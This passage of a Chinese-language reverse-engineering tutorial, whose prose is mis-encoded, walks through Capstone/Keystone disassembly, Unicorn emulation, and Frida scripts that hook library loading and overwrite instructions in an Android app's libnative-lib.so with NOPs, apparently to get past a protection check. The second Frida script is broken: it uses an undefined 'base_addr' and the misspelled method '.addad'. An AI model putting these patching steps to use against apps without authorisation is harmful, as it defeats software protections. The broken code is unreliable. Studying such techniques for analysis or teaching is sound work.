keystone</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="comment">#ks=Ks(CODE_ARCH_X86,KS_MODE_64)</span></span><br><span class="line">kp = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(kp.asm(i.mnemonic+<span class="string">&quot; &quot;</span>+i.op_str))</span><br><span class="line">    </span><br><span class="line">capstoneå¦ä¸€ç§å†™æ³•</span><br><span class="line">//Capstone cs=new Capstone(Capstone.CS_ARCH_ARM,Capstone.CS_MODE_THUMB);</span><br><span class="line">Instruction[] disasm=cs.disasm(code,address);</span><br><span class="line"><span class="keyword">for</span>(Instruction i:disasm)&#123;</span><br><span class="line">    System.out.<span class="built_in">print</span>(String.<span class="built_in">format</span>(<span class="string">&quot;0x%x:%s %s&quot;</span>,i.getAddress(),i.getMnemonic(),i.getOpStr()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨fridaå†…åµŒçš„capstone"><strong>åˆ©ç”¨fridaå†…åµŒçš„capstone</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€è¿›è¡Œpatch">åŠ¨æ€è¿›è¡Œpatch</h3><p>å½“hook è¿™ä¸ª.soæ–‡ä»¶æ—¶è¿›ç¨‹è¢«ç»ˆç«¯ æ‰€ä»¥ä½¿ç”¨dlopenå…ˆåŠ è½½è¿™ä¸ªlibnative-lib.soæ–‡ä»¶,åœ¨patch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopenå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯.soè·¯å¾„</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hook</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x92C2</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    <span class="comment">//æˆ–è€…ä½¿ç”¨fridaå†…ç½®keystoneä»£æ›¿ä¸Šé¢ä¸¤è¡Œä»£ç </span></span><br><span class="line">        <span class="keyword">var</span> patchaddr=base.<span class="title function_">add</span>(<span class="number">0x92C2</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(patchaddr, <span class="number">4</span>, <span class="function"><span class="params">patchaddr</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr);</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr.<span class="title function_">add</span>(<span class="number">2</span>));</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw.<span class="title function_">flush</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä¿®æ”¹ä¸ºnopnop</span></span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x92C2</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x9498</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x9498</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookTest6);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥hooklinkeræ‰¾åˆ°call_functionå‡½æ•°ï¼Œhookä»–çš„å‚æ•°==&gt;åŠ è½½soè·¯å¾„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> linkermodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;linker&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = linkermodule.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(symbol.<span class="property">name</span>);</span><br><span class="line">        <span class="comment">//LogPrint(linkername + &quot;-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;__dl__ZL13call_functionPKcPFviPPcS2_ES0_&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.<span class="property">address</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(call_function_addr);</span><br><span class="line">            <span class="comment">//LogPrint(&quot;linker-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address)</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(call_function_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> type = <span class="title function_">ptr</span>(args[<span class="number">0</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="keyword">var</span> address = args[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;loadso:&quot;</span> + sopath + <span class="string">&quot;--addr:&quot;</span> + address + <span class="string">&quot;--type:&quot;</span> + type);</span><br><span class="line">            <span class="keyword">if</span> (sopath.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">addad</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook);</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒè¯¾æ—¶">ç¬¬äºŒè¯¾æ—¶</h2><h3 id="unicornç®€å•æ¨¡æ‹Ÿæ‰§è¡Œ-add-R0-R1">unicornç®€å•æ¨¡æ‹Ÿæ‰§è¡Œ add R0,R1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#.text:00012836 08 44                       ADD             R0, R1  ; Rd = Op1 + Op2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i))) <span class="comment">#åˆ©ç”¨å¯„å­˜å™¨åºå·è¾“å‡ºå¯„å­˜å™¨çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,size) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    mu.emu_start(address+<span class="number">1</span>,address+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h3 id="Unicornçš„hook">Unicornçš„hook</h3><p><img src="/posts/466ed760.htm/image-20240504204827496.png" alt="image-20240504204827496"></p><h4 id="UC-HOOK-CODE">UC_HOOK_CODE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):    <span class="comment">#æ‰“å°ARM32ä¸‹çš„æ‰€æœ‰å¯„å­˜å™¨å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):  <span class="comment">#å®šä¹‰çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span>  <span class="comment">#add R0,R1</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#è¿™ä¸ªå‡½æ•°è¿”å›bytearrayç±»å‹</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)  <span class="comment">#å¯„å­˜å™¨èµ‹å€¼</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ¨¡æ‹Ÿæ‰§è¡Œåå¯„å­˜å™¨å†…å®¹-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)                        <span class="comment">#è¾“å‡ºè¿è¡Œåçš„å¯„å­˜å™¨å†…å®¹</span></span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #æ‰“å°å†…å­˜ä¸­çš„å€¼</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å½¢å¼</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE">UC_HOOK_MEM_WRITE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):      <span class="comment">##æ‰“å°ARM32ä¸‹çš„æ‰€æœ‰å¯„å­˜å™¨å†…å®¹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:   <span class="comment">#å¦‚æœå¯¹å†…å­˜æ“ä½œæ˜¯å†™</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:    <span class="comment">#å¦‚æœå¯¹å†…å­˜æ“ä½œæ˜¯è¯»</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, 